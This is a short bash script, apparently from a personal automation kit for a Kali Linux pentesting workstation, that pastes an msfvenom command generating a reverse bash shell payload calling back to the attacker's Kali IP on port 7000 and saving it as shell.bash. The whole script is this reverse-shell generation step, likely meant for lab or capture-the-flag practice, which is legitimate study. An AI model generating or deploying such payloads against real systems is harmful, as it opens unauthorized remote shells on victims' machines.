#!/bin/bash

"""
Create Bash file
"""

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "msfvenom -p cmd/unix/reverse_bash LHOST=${KALI_IP} LPORT=7000 -f raw -o shell.bash"
